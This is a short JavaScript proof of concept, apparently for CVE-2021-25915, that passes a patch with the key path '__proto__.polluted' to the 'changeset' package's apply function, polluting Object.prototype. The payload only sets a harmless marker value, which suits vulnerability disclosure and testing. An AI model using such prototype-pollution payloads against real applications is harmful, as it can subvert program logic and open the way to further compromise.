//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25915
 
   

  const changeset = require("changeset");
  const patch = [{ type: "put", key: ["__proto__", "polluted"], value: "yes" }];
  changeset.apply(patch, {}, true);
// End of file
